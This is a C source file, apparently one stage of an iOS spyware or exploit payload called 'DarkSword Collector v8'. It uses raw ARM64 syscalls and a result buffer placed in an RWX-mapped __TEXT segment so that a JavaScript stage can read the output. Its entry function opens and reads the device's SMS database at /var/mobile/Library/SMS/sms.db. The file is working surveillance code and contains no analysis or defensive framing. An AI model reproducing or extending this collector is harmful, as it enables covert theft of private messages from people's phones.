/**
 * DarkSword Collector v8 - Raw syscalls, buffer in __TEXT segment
 * __TEXT is mapped RWX by MachOPayloadBuilder, so we can write to it
 * JS reads ds_result from __TEXT after ds_start returns
 */

static int _strlen(const char *s) { int n=0; while(s[n]) n++; return n; }
static void _memcpy(char *dst, const char *src, int n) { for(int i=0;i<n;i++) dst[i]=src[i]; }
static int _itoa(int val, char *buf) {
    int i=0; char tmp[16]; int t=0;
    if(val==0){buf[0]='0';buf[1]=0;return 1;}
    while(val>0){tmp[t++]='0'+(val%10);val/=10;}
    for(int j=t-1;j>=0;j--) buf[i++]=tmp[j];
    buf[i]=0; return i;
}

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6
#define SYS_write 4

/* Buffer in __TEXT,__const - MachOPayloadBuilder maps __TEXT RWX */
__attribute__((section("__TEXT,__const")))
char result_buf[2048];
__attribute__((section("__TEXT,__const")))
int result_len;

static void _append(const char *s) {
    int sl = _strlen(s);
    int pos = result_len;
    if (pos + sl < 2047) {
        _memcpy(result_buf + pos, s, sl);
        result_len = pos + sl;
        result_buf[result_len] = 0;
    }
}
static void _append_int(int v) { char b[16]; _itoa(v,b); _append(b); }

void ds_start(void) {
    /* Reset */
    result_buf[0] = 0;
    result_len = 0;

    /* Write to stderr as debug signal */
    const char *msg = "[v8] ds_start\n";
    _svc3(SYS_write, 2, (long)msg, _strlen(msg));

    /* Try open + read SMS db */
    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/SMS/sms.db", 0);
    if (fd >= 0) {
        char data[256];
        int n = (int)_svc3(SYS_read, fd, (long)data, sizeof(data)-1);
        _svc1(SYS_close, fd);
        if (n < 0) n = 0;
        data[n] = 0;

        _append("{\"SMS\":{\"size\":");
        _append_int(n);
        _append(",\"ok\":true}}");
    } else {
        _append("{\"SMS\":{\"ok\":false}}");
    }

    const char *done = "[v8] done\n";
    _svc3(SYS_write, 2, (long)done, _strlen(done));
}